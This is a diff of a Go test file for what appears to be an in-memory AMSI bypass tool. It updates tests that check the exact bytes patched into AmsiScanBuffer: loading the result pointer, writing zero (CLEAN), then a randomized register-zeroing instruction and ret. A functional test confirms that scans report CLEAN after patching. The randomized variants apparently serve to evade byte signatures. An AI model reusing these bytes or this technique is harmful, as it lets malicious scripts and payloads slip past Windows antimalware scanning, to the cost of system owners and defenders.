@@ -239,18 +239,21 @@ func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
 		t.Fatalf("Enable() = %v", err)
 	}
 	defer a.Disable()
-	// The patch starts with "mov dword ptr [rsp+0x30], 0" (C7 44 24 30 00 00 00 00)
-	// to write AMSI_RESULT_CLEAN to the 6th argument, then a register-
-	// zeroing instruction, then ret.
-	live := make([]byte, 8)
-	for i := 0; i < 8; i++ {
+	// The patch starts with:
+	//   48 8B 44 24 30   mov rax, [rsp+0x30]   (load result pointer)
+	//   C7 00 00 00 00 00 mov [rax], 0          (*result = 0)
+	live := make([]byte, 11)
+	for i := 0; i < 11; i++ {
 		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
 	}
-	if live[0] != 0xC7 || live[1] != 0x44 || live[2] != 0x24 || live[3] != 0x30 {
-		t.Errorf("patch does not start with mov [rsp+0x30],0 at 0x%X: %02X %02X %02X %02X", a.fp.addr, live[0], live[1], live[2], live[3])
+	if live[0] != 0x48 || live[1] != 0x8B || live[2] != 0x44 || live[3] != 0x24 || live[4] != 0x30 {
+		t.Errorf("patch does not start with mov rax,[rsp+0x30] at 0x%X: %02X %02X %02X %02X %02X", a.fp.addr, live[0], live[1], live[2], live[3], live[4])
 	}
-	if live[4] != 0x00 || live[5] != 0x00 || live[6] != 0x00 || live[7] != 0x00 {
-		t.Errorf("mov [rsp+0x30] immediate is not zero: %02X %02X %02X %02X", live[4], live[5], live[6], live[7])
+	if live[5] != 0xC7 || live[6] != 0x00 {
+		t.Errorf("bytes 5..6 not mov [rax],0: %02X %02X", live[5], live[6])
+	}
+	if live[7] != 0x00 || live[8] != 0x00 || live[9] != 0x00 || live[10] != 0x00 {
+		t.Errorf("mov [rax] immediate is not zero: %02X %02X %02X %02X", live[7], live[8], live[9], live[10])
 	}
 }
 
@@ -258,51 +261,54 @@ func TestRandomAmsiPatchBytes_Contract(t *testing.T) {
 	seen := make(map[byte]bool)
 	for i := 0; i < 1000; i++ {
 		patch := randomAmsiPatchBytes()
-		// Bytes 0..7 must be: C7 44 24 30 00 00 00 00
-		// (mov dword ptr [rsp+0x30], 0 — write to 6th arg)
-		if patch[0] != 0xC7 || patch[1] != 0x44 || patch[2] != 0x24 || patch[3] != 0x30 {
-			t.Fatalf("patch does not start with mov [rsp+0x30],0: %02X %02X %02X %02X", patch[0], patch[1], patch[2], patch[3])
+		// Bytes 0..4: 48 8B 44 24 30 = mov rax, [rsp+0x30]
+		if patch[0] != 0x48 || patch[1] != 0x8B || patch[2] != 0x44 || patch[3] != 0x24 || patch[4] != 0x30 {
+			t.Fatalf("bytes 0..4 not mov rax,[rsp+0x30]: %02X %02X %02X %02X %02X", patch[0], patch[1], patch[2], patch[3], patch[4])
 		}
-		if patch[4] != 0x00 || patch[5] != 0x00 || patch[6] != 0x00 || patch[7] != 0x00 {
-			t.Fatalf("mov [rsp+0x30] immediate is not zero: %02X %02X %02X %02X", patch[4], patch[5], patch[6], patch[7])
+		// Bytes 5..10: C7 00 00 00 00 00 = mov dword ptr [rax], 0
+		if patch[5] != 0xC7 || patch[6] != 0x00 {
+			t.Fatalf("bytes 5..6 not mov [rax],0: %02X %02X", patch[5], patch[6])
 		}
-		// Bytes 8..N must be a valid zeroing instruction.
-		switch patch[8] {
+		if patch[7] != 0x00 || patch[8] != 0x00 || patch[9] != 0x00 || patch[10] != 0x00 {
+			t.Fatalf("mov [rax] immediate is not zero: %02X %02X %02X %02X", patch[7], patch[8], patch[9], patch[10])
+		}
+		// Bytes 11..N must be a valid zeroing instruction.
+		switch patch[11] {
 		case 0x33:
-			if patch[9] != 0xC0 {
-				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[8], patch[9])
+			if patch[12] != 0xC0 {
+				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[11], patch[12])
 			}
 		case 0x31:
-			if patch[9] != 0xC0 {
-				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[8], patch[9])
+			if patch[12] != 0xC0 {
+				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[11], patch[12])
 			}
 		case 0x29:
-			if patch[9] != 0xC0 {
-				t.Fatalf("invalid sub eax,eax: %02X %02X", patch[8], patch[9])
+			if patch[12] != 0xC0 {
+				t.Fatalf("invalid sub eax,eax: %02X %02X", patch[11], patch[12])
 			}
 		case 0x48:
-			if patch[9] != 0x31 || patch[10] != 0xC0 {
-				t.Fatalf("invalid xor rax,rax: %02X %02X %02X", patch[8], patch[9], patch[10])
+			if patch[12] != 0x31 || patch[13] != 0xC0 {
+				t.Fatalf("invalid xor rax,rax: %02X %02X %02X", patch[11], patch[12], patch[13])
 			}
 		default:
-			t.Fatalf("unexpected zeroing opcode at offset 8: %02X", patch[8])
+			t.Fatalf("unexpected zeroing opcode at offset 11: %02X", patch[11])
 		}
 		retIdx := -1
-		for j := 8; j < len(patch); j++ {
+		for j := 11; j < len(patch); j++ {
 			if patch[j] == 0xC3 {
 				retIdx = j
 				break
 			}
 		}
 		zeroLen := 2
-		if patch[8] == 0x48 {
+		if patch[11] == 0x48 {
 			zeroLen = 3
 		}
-		expectedRet := 8 + zeroLen
+		expectedRet := 11 + zeroLen
 		if retIdx != expectedRet {
 			t.Fatalf("ret at index %d, want %d", retIdx, expectedRet)
 		}
-		seen[patch[8]] = true
+		seen[patch[11]] = true
 	}
 	if len(seen) < 4 {
 		t.Errorf("only %d unique zeroing variants seen in 1000 iterations: %v", len(seen), seen)
@@ -462,6 +468,9 @@ func TestAMSIControl_FunctionalContract(t *testing.T) {
 	t.Logf("after patch: HRESULT=0x%X, result=%d", post.HRESULT, post.Result)
 	if post.HRESULT != 0 {
 		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after patch (expected S_OK)", post.HRESULT)
+	}
+	if post.Result != amsiResultClean {
+		t.Errorf("AmsiScanBuffer returned result=%d after patch (expected %d=CLEAN)", post.Result, amsiResultClean)
 	}
 
 	// --- RESTORE ---
